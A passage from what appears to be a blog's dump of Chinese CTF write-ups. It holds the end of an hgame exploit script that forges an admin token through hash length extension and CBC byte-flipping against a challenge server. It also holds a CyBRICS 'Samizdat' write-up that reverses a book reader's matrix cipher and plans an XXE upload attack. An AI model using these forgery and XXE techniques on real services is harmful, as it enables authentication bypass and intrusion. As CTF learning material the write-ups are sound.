class="keyword">not</span> <span class="keyword">in</span> string.printable:</span><br><span class="line">        unprintable += bytes([i])</span><br><span class="line"></span><br><span class="line">cli = remoteCLI.CLI()</span><br><span class="line">cli.connect(<span class="string">"47.95.212.185"</span>, <span class="number">38611</span>)</span><br><span class="line">cli.sendLine(<span class="string">"1"</span>)</span><br><span class="line">cli.sendLine(hexlify(<span class="string">b'\x00\x00'</span>))</span><br><span class="line">token = cli.recvUntilFind(regToken)[<span class="number">0</span>]</span><br><span class="line">token = unhexlify(token)</span><br><span class="line"></span><br><span class="line">sig = token[-BLOCK_LENGTH:]</span><br><span class="line">res = hashpumpy.hashpump(hexlify(sig), <span class="string">'\x00\x00'</span>, <span class="string">'admin'</span>, <span class="number">16</span>)</span><br><span class="line"><span class="keyword">assert</span> res[<span class="number">1</span>].strip(unprintable) == <span class="string">b'admin'</span></span><br><span class="line">print(res)</span><br><span class="line"></span><br><span class="line">newSig = bytearray(unhexlify(res[<span class="number">0</span>]))</span><br><span class="line">newPt = bytearray(res[<span class="number">1</span>])</span><br><span class="line">newPt[<span class="number">-1</span>] = ord(<span class="string">'e'</span>)  <span class="comment"># change last byte to e</span></span><br><span class="line">offset = len(newPt) % BLOCK_LENGTH - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">padLen = BLOCK_LENGTH - len(newPt) % BLOCK_LENGTH</span><br><span class="line">newPt += bytearray([padLen]) * padLen</span><br><span class="line">print(newPt)</span><br><span class="line"><span class="keyword">assert</span> len(newPt) // BLOCK_LENGTH == <span class="number">4</span></span><br><span class="line"></span><br><span class="line">b1st = bytearray()</span><br><span class="line">b2nd = bytearray()</span><br><span class="line">b3rd = bytearray()</span><br><span class="line">b4th = bytearray()</span><br><span class="line">midVal = bytearray()</span><br><span class="line"></span><br><span class="line">cli.sendLine(<span class="string">"1"</span>)</span><br><span class="line">cli.sendLine(hexlify(newPt[<span class="number">-2</span> * BLOCK_LENGTH:]))  <span class="comment"># encrypt last two block</span></span><br><span class="line">token = cli.recvUntilFind(regToken)[<span class="number">0</span>]</span><br><span class="line">token = unhexlify(token)</span><br><span class="line">token = bytearray(token)</span><br><span class="line">iv = token[:BLOCK_LENGTH]</span><br><span class="line">cipher = token[BLOCK_LENGTH:<span class="number">-2</span> * BLOCK_LENGTH]  <span class="comment"># get the encrypted block and drop the padding</span></span><br><span class="line">cipher[offset] ^= ord(<span class="string">"e"</span>)  <span class="comment"># flip the byte, admie -&gt; admin</span></span><br><span class="line">cipher[offset] ^= ord(<span class="string">"n"</span>)</span><br><span class="line">b4th = cipher[BLOCK_LENGTH:]  <span class="comment"># the last block is the final block</span></span><br><span class="line">b3rd = cipher[:BLOCK_LENGTH]</span><br><span class="line"></span><br><span class="line">cli.sendLine(<span class="string">"2"</span>)</span><br><span class="line">cli.sendLine(hexlify(ZEROS + cipher + ZEROS))</span><br><span class="line">token = cli.recvUntilFind(regUsername)[<span class="number">0</span>]</span><br><span class="line">token = bytearray(unhexlify(token))</span><br><span class="line"><span class="keyword">assert</span> <span class="string">b'admin'</span> <span class="keyword">in</span> token</span><br><span class="line">midVal = token[:BLOCK_LENGTH]  <span class="comment"># the mid val of 3rd block</span></span><br><span class="line">b2nd = xor(midVal, newPt[<span class="number">-2</span> * BLOCK_LENGTH:-BLOCK_LENGTH])</span><br><span class="line"></span><br><span class="line">cli.sendLine(<span class="string">"2"</span>)  <span class="comment"># decrypt 2nd to get mid val</span></span><br><span class="line">cli.sendLine(hexlify(ZEROS + b2nd + b3rd + b4th + ZEROS))</span><br><span class="line">token = cli.recvUntilFind(regUsername)[<span class="number">0</span>]</span><br><span class="line">token = unhexlify(token)</span><br><span class="line">token = bytearray(token)</span><br><span class="line">midVal = token[:BLOCK_LENGTH]  <span class="comment"># get the mid val of 2nd block</span></span><br><span class="line">b1nd = xor(midVal, newPt[<span class="number">-3</span> * BLOCK_LENGTH:<span class="number">-2</span> * BLOCK_LENGTH])</span><br><span class="line"></span><br><span class="line">cli.sendLine(<span class="string">"2"</span>)  <span class="comment"># decrypt 1nd to get mid val</span></span><br><span class="line">cli.sendLine(hexlify(ZEROS + b1nd + b2nd + b3rd + b4th + ZEROS))</span><br><span class="line">token = cli.recvUntilFind(regUsername)[<span class="number">0</span>]</span><br><span class="line">token = unhexlify(token)</span><br><span class="line">token = bytearray(token)</span><br><span class="line">midVal = token[:BLOCK_LENGTH]  <span class="comment"># get the mid val of 1nd block</span></span><br><span class="line">iv = xor(midVal, newPt[<span class="number">-4</span> * BLOCK_LENGTH:<span class="number">-3</span> * BLOCK_LENGTH])</span><br><span class="line"></span><br><span class="line">print(hexlify(iv + b1nd + b2nd + b3rd + b4th + newSig))</span><br><span class="line">cli.sendLine(<span class="string">"2"</span>)</span><br><span class="line">cli.sendLine(hexlify(iv + b1nd + b2nd + b3rd + b4th + newSig))</span><br><span class="line">cli.console()</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>writeup</tag>
        <tag>hgame</tag>
      </tags>
  </entry>
  <entry>
    <title>CyBRICS CTF Samizdat Writeup</title>
    <url>/2019/07/22/CyBRICS-CTF-Samizdat-Writeup/</url>
    <content><![CDATA[<p>这题是在比赛结束后才做出来的, 比较可惜, 但是题目本身还是比较有意思的, 所以写个 Writeup.<br>(早知道早点起床做题了</p>
<a id="more"></a>

<p>首先打开来可以下载  </p>
<ul>
<li>阅读器</li>
<li>guide.txt</li>
<li>两本加密过的书</li>
</ul>
<p>其中阅读器能解密书, 但是只能读前 100 页, 接下来自然是 IDA F5 伺候一下阅读器,  </p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)decrypt((<span class="keyword">unsigned</span> __int8 *)ptr, n, &amp;v11, &amp;v12) )</span><br><span class="line">    &#123;</span><br><span class="line">      v9 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;_bss_start, <span class="string">"Failed to decrypt book"</span>);</span><br><span class="line">      <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v9, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v7 = decompress_book(v11, v12, &amp;v14, &amp;v13);</span><br><span class="line">      <span class="built_in">free</span>(ptr);</span><br><span class="line">      <span class="keyword">if</span> ( v7 )</span><br><span class="line">      &#123;</span><br><span class="line">        v8 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;_bss_start, <span class="string">"Failed to decompress book"</span>);</span><br><span class="line">        <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v8, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      read_book(v14, v3, v13);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>发现其实就是解密 + zlib 解压缩, 然后小说本体保存形式是 xml, 用 libxml 来解析.</p>
<p>接下来逆向解密算法, 发现在 decrypt 里面调用了 decrypt_block, 实际上是分块密码, 每 16 字节分块解密, 而 decrypt_block 的实现如下  </p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">ptr = <span class="built_in">malloc</span>(<span class="number">0x10</span>uLL);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">15</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      v1 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt;= <span class="number">15</span>; ++k )</span><br><span class="line">        v1 += Mminus[<span class="number">16</span> * k + j] * a1[k];</span><br><span class="line">      ptr[j] = v1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( l = <span class="number">0</span>; l &lt;= <span class="number">15</span>; ++l )</span><br><span class="line">      a1[l] = ptr[(<span class="keyword">unsigned</span> __int8)Pminus[l]];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>(ptr);</span><br></pre></td></tr></table></figure>
<p>转成 python 代码可能更容易看懂, 其中 Mminus 是大小 256 的数组, Pminus 是大小 16 的数组, </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt_block</span><span class="params">(block)</span>:</span></span><br><span class="line">    block = bytearray(block)</span><br><span class="line">    ptr = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">            t = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">                t += Mminus[<span class="number">16</span> * k + j] * block[k]</span><br><span class="line">            ptr[j] = t % <span class="number">256</span></span><br><span class="line">        <span class="keyword">for</span> l <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">            block[l] = ptr[Pminus[l]]</span><br><span class="line">    <span class="keyword">return</span> block</span><br></pre></td></tr></table></figure>
<p>学过线性代数可以看出, 其实就是算了个矩阵乘法, 然后置换一下, Mminus 就是个 16 * 16 的矩阵.</p>
<p>搞懂之后就可以写算法解密了, </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Mminus = [</span><br><span class="line">    <span class="number">135</span>, <span class="number">25</span>, <span class="number">77</span>, <span class="number">128</span>, <span class="number">251</span>, <span class="number">9</span>, <span class="number">168</span>, <span class="number">169</span>, <span class="number">158</span>, <span class="number">82</span>, <span class="number">7</span>, <span class="number">213</span>, <span class="number">229</span>, <span class="number">180</span>, <span class="number">50</span>, <span class="number">53</span>, <span class="number">172</span>,</span><br><span class="line">    <span class="number">215</span>, <span class="number">32</span>, <span class="number">243</span>, <span class="number">113</span>, <span class="number">44</span>, <span class="number">134</span>, <span class="number">5</span>, <span class="number">22</span>, <span class="number">41</span>, <span class="number">89</span>, <span class="number">130</span>, <span class="number">171</span>, <span class="number">42</span>, <span class="number">81</span>, <span class="number">122</span>, <span class="number">38</span>, <span class="number">36</span>,</span><br><span class="line">    <span class="number">125</span>, <span class="number">25</span>, <span class="number">127</span>, <span class="number">38</span>, <span class="number">246</span>, <span class="number">241</span>, <span class="number">34</span>, <span class="number">33</span>, <span class="number">153</span>, <span class="number">238</span>, <span class="number">105</span>, <span class="number">228</span>, <span class="number">82</span>, <span class="number">86</span>, <span class="number">43</span>, <span class="number">81</span>,</span><br><span class="line">    <span class="number">161</span>, <span class="number">104</span>, <span class="number">26</span>, <span class="number">102</span>, <span class="number">238</span>, <span class="number">143</span>, <span class="number">134</span>, <span class="number">142</span>, <span class="number">221</span>, <span class="number">135</span>, <span class="number">141</span>, <span class="number">241</span>, <span class="number">71</span>, <span class="number">237</span>, <span class="number">153</span>,</span><br><span class="line">    <span class="number">159</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">231</span>, <span class="number">133</span>, <span class="number">139</span>, <span class="number">200</span>, <span class="number">78</span>, <span class="number">53</span>, <span class="number">197</span>, <span class="number">62</span>, <span class="number">167</span>, <span class="number">79</span>, <span class="number">221</span>, <span class="number">92</span>, <span class="number">164</span>,</span><br><span class="line">    <span class="number">120</span>, <span class="number">15</span>, <span class="number">48</span>, <span class="number">121</span>, <span class="number">90</span>, <span class="number">62</span>, <span class="number">163</span>, <span class="number">231</span>, <span class="number">118</span>, <span class="number">173</span>, <span class="number">36</span>, <span class="number">125</span>, <span class="number">92</span>, <span class="number">123</span>, <span class="number">165</span>, <span class="number">5</span>,</span><br><span class="line">    <span class="number">106</span>, <span class="number">129</span>, <span class="number">156</span>, <span class="number">145</span>, <span class="number">228</span>, <span class="number">50</span>, <span class="number">99</span>, <span class="number">209</span>, <span class="number">164</span>, <span class="number">50</span>, <span class="number">115</span>, <span class="number">230</span>, <span class="number">125</span>, <span class="number">17</span>, <span class="number">76</span>, <span class="number">208</span>,</span><br><span class="line">    <span class="number">67</span>, <span class="number">38</span>, <span class="number">0</span>, <span class="number">246</span>, <span class="number">90</span>, <span class="number">54</span>, <span class="number">107</span>, <span class="number">115</span>, <span class="number">172</span>, <span class="number">92</span>, <span class="number">153</span>, <span class="number">102</span>, <span class="number">32</span>, <span class="number">1</span>, <span class="number">21</span>, <span class="number">80</span>, <span class="number">145</span>,</span><br><span class="line">    <span class="number">209</span>, <span class="number">176</span>, <span class="number">31</span>, <span class="number">250</span>, <span class="number">68</span>, <span class="number">90</span>, <span class="number">243</span>, <span class="number">94</span>, <span class="number">112</span>, <span class="number">161</span>, <span class="number">234</span>, <span class="number">223</span>, <span class="number">204</span>, <span class="number">79</span>, <span class="number">209</span>, <span class="number">222</span>,</span><br><span class="line">    <span class="number">16</span>, <span class="number">77</span>, <span class="number">188</span>, <span class="number">221</span>, <span class="number">125</span>, <span class="number">90</span>, <span class="number">112</span>, <span class="number">10</span>, <span class="number">80</span>, <span class="number">103</span>, <span class="number">77</span>, <span class="number">99</span>, <span class="number">139</span>, <span class="number">178</span>, <span class="number">137</span>, <span class="number">128</span>,</span><br><span class="line">    <span class="number">192</span>, <span class="number">57</span>, <span class="number">24</span>, <span class="number">243</span>, <span class="number">125</span>, <span class="number">252</span>, <span class="number">140</span>, <span class="number">90</span>, <span class="number">250</span>, <span class="number">132</span>, <span class="number">220</span>, <span class="number">194</span>, <span class="number">154</span>, <span class="number">121</span>, <span class="number">114</span>, <span class="number">55</span>,</span><br><span class="line">    <span class="number">27</span>, <span class="number">129</span>, <span class="number">61</span>, <span class="number">196</span>, <span class="number">244</span>, <span class="number">42</span>, <span class="number">191</span>, <span class="number">242</span>, <span class="number">188</span>, <span class="number">254</span>, <span class="number">166</span>, <span class="number">59</span>, <span class="number">232</span>, <span class="number">94</span>, <span class="number">237</span>, <span class="number">209</span>,</span><br><span class="line">    <span class="number">192</span>, <span class="number">58</span>, <span class="number">47</span>, <span class="number">238</span>, <span class="number">147</span>, <span class="number">6</span>, <span class="number">244</span>, <span class="number">230</span>, <span class="number">134</span>, <span class="number">184</span>, <span class="number">235</span>, <span class="number">16</span>, <span class="number">53</span>, <span class="number">81</span>, <span class="number">121</span>, <span class="number">248</span>,</span><br><span class="line">    <span class="number">117</span>, <span class="number">158</span>, <span class="number">17</span>, <span class="number">87</span>, <span class="number">247</span>, <span class="number">205</span>, <span class="number">16</span>, <span class="number">129</span>, <span class="number">123</span>, <span class="number">255</span>, <span class="number">3</span>, <span class="number">89</span>, <span class="number">11</span>, <span class="number">98</span>, <span class="number">58</span>, <span class="number">125</span>, <span class="number">181</span>,</span><br><span class="line">    <span class="number">236</span>, <span class="number">40</span>, <span class="number">99</span>, <span class="number">141</span>, <span class="number">232</span>, <span class="number">115</span>, <span class="number">85</span>, <span class="number">100</span>, <span class="number">205</span>, <span class="number">190</span>, <span class="number">84</span>, <span class="number">226</span>, <span class="number">217</span>, <span class="number">214</span>, <span class="number">115</span>, <span class="number">62</span>,</span><br><span class="line">    <span class="number">216</span>, <span class="number">239</span>, <span class="number">44</span>, <span class="number">111</span>, <span class="number">69</span>, <span class="number">135</span>, <span class="number">142</span>, <span class="number">248</span>, <span class="number">240</span>, <span class="number">180</span>, <span class="number">157</span>, <span class="number">41</span>, <span class="number">105</span></span><br><span class="line">]</span><br><span class="line">Pminus = [</span><br><span class="line">    <span class="string">'\f'</span>, <span class="string">'\x0F'</span>, <span class="string">'\x0E'</span>, <span class="string">'\b'</span>, <span class="string">'\x03'</span>, <span class="string">'\v'</span>, <span class="string">'\r'</span>, <span class="string">'\0'</span>, <span class="string">'\a'</span>, <span class="string">'\t'</span>, <span class="string">'\n'</span>,</span><br><span class="line">    <span class="string">'\x06'</span>, <span class="string">'\x02'</span>, <span class="string">'\x01'</span>, <span class="string">'\x05'</span>, <span class="string">'\x04'</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> seq, c <span class="keyword">in</span> enumerate(Pminus):</span><br><span class="line">    Pminus[seq] = ord(c)</span><br><span class="line"></span><br><span class="line">f = open(<span class="string">'3ba9318b509034cb7b506df0faef4d80.fb2enc'</span>, <span class="string">'rb'</span>).read()</span><br><span class="line"><span class="comment">#f = open('6506dad64d2353f25cca891f81443a8e.fb2enc', 'rb').read()</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt_block</span><span class="params">(block)</span>:</span></span><br><span class="line">    block = bytearray(block)</span><br><span class="line">    ptr = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">            t = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">                t += Mminus[<span class="number">16</span> * k + j] * block[k]</span><br><span class="line">            ptr[j] = t % <span class="number">256</span></span><br><span class="line">        <span class="keyword">for</span> l <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">            block[l] = ptr[Pminus[l]]</span><br><span class="line">    <span class="keyword">return</span> block</span><br><span class="line"></span><br><span class="line">book = bytearray()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(f), <span class="number">16</span>):</span><br><span class="line">    book.extend(decrypt_block(f[i:i + <span class="number">16</span>]))</span><br><span class="line"></span><br><span class="line">dec = zlib.decompress(bytes(book))</span><br><span class="line">open(<span class="string">'output2.xml'</span>, <span class="string">'wb'</span>).write(dec)</span><br></pre></td></tr></table></figure>

<p>然后解密给的两本书, 发现里面真的就是两本小说 (<br>而且正文都是西里尔字母, 也看不懂 233</p>
<p>接下来的目标应该不是这两本小说, 再回到网站.<br>访问 robots.txt, 发现给了提示  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: &#x2F;authorszone</span><br></pre></td></tr></table></figure>

<p>在 <code>http://45.77.219.97/authorszone</code> 里面是上传书的地方, 而且只能上传加密过后的书.<br>再结合之前书的本体是 xml, 那么可以想到是 XXE 了.<br>接下来是写出加密算法, 实际上就是矩阵方程求解, 因为是 mod 256 整数环上的矩阵, 直接用 sage 来算了.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># This file was *autogenerated* from the file matrix.sage</span></span><br><span class="line"><span class="keyword">from</span> sage.all_cmdline <span class="keyword">import</span> *   <span class="comment"># import sage library</span></span><br><span class="line"></span><br><span class="line">_sage_const_256 = Integer(<span class="number">256</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_solve</span><span class="params">(y)</span>:</span></span><br><span class="line">    mat = [[<span class="number">135</span>, <span class="number">172</span>, <span class="number">38</span>, <span class="number">43</span>, <span class="number">153</span>, <span class="number">164</span>, <span class="number">5</span>, <span class="number">208</span>, <span class="number">80</span>, <span class="number">209</span>, <span class="number">137</span>, <span class="number">114</span>, <span class="number">237</span>, <span class="number">121</span>, <span class="number">58</span>, <span class="number">214</span>], [<span class="number">25</span>, <span class="number">215</span>, <span class="number">36</span>, <span class="number">81</span>, <span class="number">159</span>, <span class="number">120</span>, <span class="number">106</span>, <span class="number">67</span>, <span class="number">145</span>, <span class="number">222</span>, <span class="number">128</span>, <span class="number">55</span>, <span class="number">209</span>, <span class="number">248</span>, <span class="number">125</span>, <span class="number">115</span>], [<span class="number">77</span>, <span class="number">32</span>, <span class="number">125</span>, <span class="number">161</span>, <span class="number">65</span>, <span class="number">15</span>, <span class="number">129</span>, <span class="number">38</span>, <span class="number">209</span>, <span class="number">16</span>, <span class="number">192</span>, <span class="number">27</span>, <span class="number">192</span>, <span class="number">117</span>, <span class="number">181</span>, <span class="number">62</span>], [<span class="number">128</span>, <span class="number">243</span>, <span class="number">25</span>, <span class="number">104</span>, <span class="number">0</span>, <span class="number">48</span>, <span class="number">156</span>, <span class="number">0</span>, <span class="number">176</span>, <span class="number">77</span>, <span class="number">57</span>, <span class="number">129</span>, <span class="number">58</span>, <span class="number">158</span>, <span class="number">236</span>, <span class="number">216</span>], [<span class="number">251</span>, <span class="number">113</span>, <span class="number">127</span>, <span class="number">26</span>, <span class="number">231</span>, <span class="number">121</span>, <span class="number">145</span>, <span class="number">246</span>, <span class="number">31</span>, <span class="number">188</span>, <span class="number">24</span>, <span class="number">61</span>, <span class="number">47</span>, <span class="number">17</span>, <span class="number">40</span>, <span class="number">239</span>], [<span class="number">9</span>, <span class="number">44</span>, <span class="number">38</span>, <span class="number">102</span>, <span class="number">133</span>, <span class="number">90</span>, <span class="number">228</span>, <span class="number">90</span>, <span class="number">250</span>, <span class="number">221</span>, <span class="number">243</span>, <span class="number">196</span>, <span class="number">238</span>, <span class="number">87</span>, <span class="number">99</span>, <span class="number">44</span>], [<span class="number">168</span>, <span class="number">134</span>, <span class="number">246</span>, <span class="number">238</span>, <span class="number">139</span>, <span class="number">62</span>, <span class="number">50</span>, <span class="number">54</span>, <span class="number">68</span>, <span class="number">125</span>, <span class="number">125</span>, <span class="number">244</span>, <span class="number">147</span>, <span class="number">247</span>, <span class="number">141</span>, <span class="number">111</span>], [<span class="number">169</span>, <span class="number">5</span>, <span class="number">241</span>, <span class="number">143</span>, <span class="number">200</span>, <span class="number">163</span>, <span class="number">99</span>, <span class="number">107</span>, <span class="number">90</span>, <span class="number">90</span>, <span class="number">252</span>, <span class="number">42</span>, <span class="number">6</span>, <span class="number">205</span>, <span class="number">232</span>, <span class="number">69</span>], [<span class="number">158</span>, <span class="number">22</span>, <span class="number">34</span>, <span class="number">134</span>, <span class="number">78</span>, <span class="number">231</span>, <span class="number">209</span>, <span class="number">115</span>, <span class="number">243</span>, <span class="number">112</span>, <span class="number">140</span>, <span class="number">191</span>, <span class="number">244</span>, <span class="number">16</span>, <span class="number">115</span>, <span class="number">135</span>], [<span class="number">82</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">142</span>, <span class="number">53</span>, <span class="number">118</span>, <span class="number">164</span>, <span class="number">172</span>, <span class="number">94</span>, <span class="number">10</span>, <span class="number">90</span>, <span class="number">242</span>, <span class="number">230</span>, <span class="number">129</span>, <span class="number">85</span>, <span class="number">142</span>], [<span class="number">7</span>, <span class="number">89</span>, <span class="number">153</span>, <span class="number">221</span>, <span class="number">197</span>, <span class="number">173</span>, <span class="number">50</span>, <span class="number">92</span>, <span class="number">112</span>, <span class="number">80</span>, <span class="number">250</span>, <span class="number">188</span>, <span class="number">134</span>, <span class="number">123</span>, <span class="number">100</span>, <span class="number">248</span>], [<span class="number">213</span>, <span class="number">130</span>, <span class="number">238</span>, <span class="number">135</span>, <span class="number">62</span>, <span class="number">36</span>, <span class="number">115</span>, <span class="number">153</span>, <span class="number">161</span>, <span class="number">103</span>, <span class="number">132</span>, <span class="number">254</span>, <span class="number">184</span>, <span class="number">255</span>, <span class="number">205</span>, <span class="number">240</span>], [<span class="number">229</span>, <span class="number">171</span>, <span class="number">105</span>, <span class="number">141</span>, <span class="number">167</span>, <span class="number">125</span>, <span class="number">230</span>, <span class="number">102</span>, <span class="number">234</span>, <span class="number">77</span>, <span class="number">220</span>, <span class="number">166</span>, <span class="number">235</span>, <span class="number">3</span>, <span class="number">190</span>, <span class="number">180</span>], [<span class="number">180</span>, <span class="number">42</span>, <span class="number">228</span>, <span class="number">241</span>, <span class="number">79</span>, <span class="number">92</span>, <span class="number">125</span>, <span class="number">32</span>, <span class="number">223</span>, <span class="number">99</span>, <span class="number">194</span>, <span class="number">59</span>, <span class="number">16</span>, <span class="number">89</span>, <span class="number">84</span>, <span class="number">157</span>], [<span class="number">50</span>, <span class="number">81</span>, <span class="number">82</span>, <span class="number">71</span>, <span class="number">221</span>, <span class="number">123</span>, <span class="number">17</span>, <span class="number">1</span>, <span class="number">204</span>, <span class="number">139</span>, <span class="number">154</span>, <span class="number">232</span>, <span class="number">53</span>, <span class="number">11</span>, <span class="number">226</span>, <span class="number">41</span>], [<span class="number">53</span>, <span class="number">122</span>, <span class="number">86</span>, <span class="number">237</span>, <span class="number">92</span>, <span class="number">165</span>, <span class="number">76</span>, <span class="number">21</span>, <span class="number">79</span>, <span class="number">178</span>, <span class="number">121</span>, <span class="number">94</span>, <span class="number">81</span>, <span class="number">98</span>, <span class="number">217</span>, <span class="number">105</span>]]</span><br><span class="line">    R = IntegerModRing(_sage_const_256 )</span><br><span class="line">    y = vector(R, y)</span><br><span class="line">    mat = matrix(R, mat)</span><br><span class="line">    ret = mat.solve_right(y)</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mminus = [</span><br><span class="line">    <span class="number">135</span>, <span class="number">25</span>, <span class="number">77</span>, <span class="number">128</span>, <span class="number">251</span>, <span class="number">9</span>, <span class="number">168</span>, <span class="number">169</span>, <span class="number">158</span>, <span class="number">82</span>, <span class="number">7</span>, <span class="number">213</span>, <span class="number">229</span>, <span class="number">180</span>, <span class="number">50</span>, <span class="number">53</span>, <span class="number">172</span>,</span><br><span class="line">    <span class="number">215</span>, <span class="number">32</span>, <span class="number">243</span>, <span class="number">113</span>, <span class="number">44</span>, <span class="number">134</span>, <span class="number">5</span>, <span class="number">22</span>, <span class="number">41</span>, <span class="number">89</span>, <span class="number">130</span>, <span class="number">171</span>, <span class="number">42</span>, <span class="number">81</span>, <span class="number">122</span>, <span class="number">38</span>, <span class="number">36</span>,</span><br><span class="line">    <span class="number">125</span>, <span class="number">25</span>, <span class="number">127</span>, <span class="number">38</span>, <span class="number">246</span>, <span class="number">241</span>, <span class="number">34</span>, <span class="number">33</span>, <span class="number">153</span>, <span class="number">238</span>, <span class="number">105</span>, <span class="number">228</span>, <span class="number">82</span>, <span class="number">86</span>, <span class="number">43</span>, <span class="number">81</span>,</span><br><span class="line">    <span class="number">161</span>, <span class="number">104</span>, <span class="number">26</span>, <span class="number">102</span>, <span class="number">238</span>, <span class="number">143</span>, <span class="number">134</span>, <span class="number">142</span>, <span class="number">221</span>, <span class="number">135</span>, <span class="number">141</span>, <span class="number">241</span>, <span class="number">71</span>, <span class="number">237</span>, <span class="number">153</span>,</span><br><span class="line">    <span class="number">159</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">231</span>, <span class="number">133</span>, <span class="number">139</span>, <span class="number">200</span>, <span class="number">78</span>, <span class="number">53</span>, <span class="number">197</span>, <span class="number">62</span>, <span class="number">167</span>, <span class="number">79</span>, <span class="number">221</span>, <span class="number">92</span>, <span class="number">164</span>,</span><br><span class="line">    <span class="number">120</span>, <span class="number">15</span>, <span class="number">48</span>, <span class="number">121</span>, <span class="number">90</span>, <span class="number">62</span>, <span class="number">163</span>, <span class="number">231</span>, <span class="number">118</span>, <span class="number">173</span>, <span class="number">36</span>, <span class="number">125</span>, <span class="number">92</span>, <span class="number">123</span>, <span class="number">165</span>, <span class="number">5</span>,</span><br><span class="line">    <span class="number">106</span>, <span class="number">129</span>, <span class="number">156</span>, <span class="number">145</span>, <span class="number">228</span>, <span class="number">50</span>, <span class="number">99</span>, <span class="number">209</span>, <span class="number">164</span>, <span class="number">50</span>, <span class="number">115</span>, <span class="number">230</span>, <span class="number">125</span>, <span class="number">17</span>, <span class="number">76</span>, <span class="number">208</span>,</span><br><span class="line">    <span class="number">67</span>, <span class="number">38</span>, <span class="number">0</span>, <span class="number">246</span>, <span class="number">90</span>, <span class="number">54</span>, <span class="number">107</span>, <span class="number">115</span>, <span class="number">172</span>, <span class="number">92</span>, <span class="number">153</span>, <span class="number">102</span>, <span class="number">32</span>, <span class="number">1</span>, <span class="number">21</span>, <span class="number">80</span>, <span class="number">145</span>,</span><br><span class="line">    <span class="number">209</span>, <span class="number">176</span>, <span class="number">31</span>, <span class="number">250</span>, <span class="number">68</span>, <span class="number">90</span>, <span class="number">243</span>, <span class="number">94</span>, <span class="number">112</span>, <span class="number">161</span>, <span class="number">234</span>, <span class="number">223</span>, <span class="number">204</span>, <span class="number">79</span>, <span class="number">209</span>, <span class="number">222</span>,</span><br><span class="line">    <span class="number">16</span>, <span class="number">77</span>, <span class="number">188</span>, <span class="number">221</span>, <span class="number">125</span>, <span class="number">90</span>, <span class="number">112</span>, <span class="number">10</span>, <span class="number">80</span>, <span class="number">103</span>, <span class="number">77</span>, <span class="number">99</span>, <span class="number">139</span>, <span class="number">178</span>, <span class="number">137</span>, <span class="number">128</span>,</span><br><span class="line">    <span class="number">192</span>, <span class="number">57</span>, <span class="number">24</span>, <span class="number">243</span>, <span class="number">125</span>, <span class="number">252</span>, <span class="number">140</span>, <span class="number">90</span>, <span class="number">250</span>, <span class="number">132</span>, <span class="number">220</span>, <span class="number">194</span>, <span class="number">154</span>, <span class="number">121</span>, <span class="number">114</span>, <span class="number">55</span>,</span><br><span class="line">    <span 